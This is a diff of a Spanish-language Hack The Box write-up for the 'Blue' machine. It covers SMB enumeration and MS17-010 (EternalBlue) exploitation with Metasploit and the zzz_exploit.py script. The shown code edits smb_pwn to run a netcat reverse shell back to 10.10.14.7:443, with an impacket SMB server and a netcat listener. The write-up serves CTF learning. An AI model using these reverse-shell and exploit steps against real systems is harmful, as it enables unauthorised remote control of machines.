@@ -8,9 +8,11 @@
 | Link           | [Blue](https://www.hackthebox.com/machines/blue) |
 
 ## Introducción
+
 Blue es un CTF disponible en diversas plataformas, conocido por su dificultad fácil. En esta máquina, se requiere explotar la vulnerabilidad MS17-010 para obtener una shell con privilegios de System. A lo largo del proceso, aprenderemos a enumerar la vulnerabilidad MS17-010 en la máquina utilizando Nmap, en una primera instancia se utilizara  Metasploit, y también se realizara escalamiento de privilegios a nivel de administrador con un script en Python.
 
 ## Requisitos previos
+
 Creamos **directorios** para poder almacenar los diferentes archivos de trabajo maquina.
 
 ```bash
@@ -19,6 +21,7 @@ Creamos **directorios** para poder almacenar los diferentes archivos de trabajo 
 ```
 
 ## Reconocimiento
+
 Para ver a que tipo de maquina estamos explorando, realizamos una traza ICMP hacia la maquina y como se puede observar el TTL es de 127, que esta en el rango de una maquina Windows.
 
 ![img](./img/blue/Pasted%20image%2020240526145148.png)
@@ -86,6 +89,7 @@ Como se puede observar, el servicio `smb` está presente, lo cual es muy común 
 Se conoce que el protocolo `smb` utiliza el puerto `445`. En este laboratorio, nos enfocaremos en escalar privilegios mediante este protocolo.
 
 ## Enumeración de SMB
+
 Realizamos un escaneo al protocolo SMB, que es comúnmente utilizado por los sistemas Windows para compartir archivos, impresoras y otros recursos en la red. Ejecutamos todos los scripts de `nmap` para `smb-vuln`, los cuales buscan vulnerabilidades conocidas en servicios SMB. También utilizamos el escaneo `-sT` para conexión TCP, un método más confiable en comparación con otros tipos de escaneo. Sin embargo, este método es más lento y puede ser detectado por sistemas de seguridad. En este caso, optamos por este tipo de escaneo para identificar las vulnerabilidades presentes.
 
 ```bash
@@ -130,6 +134,7 @@ SMB         10.10.10.40     445    HARIS-PC         [*] Windows 7 Professional 7
 ```
 
 ## Explotación utilizando el framework de Metasploit
+
 En este apartado vamos ayudarnos de la herramienta de `Metasploit`, para poder explotar esta maquina, realizamos la búsqueda de la vulnerabilidad en la base de datos de Metasploit.
 
 ![img](./img/blue/Pasted%20image%2020240526151354.png)
@@ -151,6 +156,7 @@ Navegamos  por los directorios del sistema, y logramos acceder como `Administrat
 ![img](./img/blue/Pasted%20image%2020240526161242.png)
 
 ## Explotación utilizando script de Python
+
 Para explotar la vulnerabilidad `Eternalblue` en sistemas operativos Windows 7, utilizaremos una aplicación desarrollada en Python. Procederemos a analizar esta vulnerabilidad a continuación y podrás descargar la herramienta desde el siguiente [repositorio](https://github.com/worawit/MS17-010/tree/master).
 
 El exploit que nos ayudará a obtener acceso se llama `zzz_exploit.py`. Es importante tener en cuenta que la vulnerabilidad permite el acceso para un usuario anónimo.
@@ -228,7 +234,7 @@ Y modificar la función `smb_pwn` con los siguientes cambios, donde se configura
 def smb_pwn(conn, arch):
         smbConn = conn.get_smbconnection()
 
-		# Esta ejecucion de servicio nos permite cargar el archivo descargado de netcat para Windows y cargarlo en la maquina objetivo y ejecutarlo.
+  # Esta ejecucion de servicio nos permite cargar el archivo descargado de netcat para Windows y cargarlo en la maquina objetivo y ejecutarlo.
         service_exec(conn, r'cmd /c \\10.10.14.7\smbFolder\nc.exe -e cmd 10.10.14.7 443')
 ```
 
@@ -239,16 +245,19 @@ Al descomprimir estos archivos en el directorio de trabajo obtenemos los siguien
 ![img](./img/blue/Pasted%20image%2020240626131739.png)
 
 Pasar los archivos desde la maquina de trabajo a la maquina objetivo
+
 ```bash
 impacket-smbserver smbFolder $(pwd) -smb2support
 ```
 
 Y también colocamos a escuchar un `netcat` en la maquina host
+
 ```bash
 rlwrap nc -nlvp 443
 ```
 
 Luego ejecutarnos nuestro Exploit para poder obtener los accesos a la maquina.
+
 ```bash
 python2 zzz_exploit.py 10.10.10.40 samr
 ```
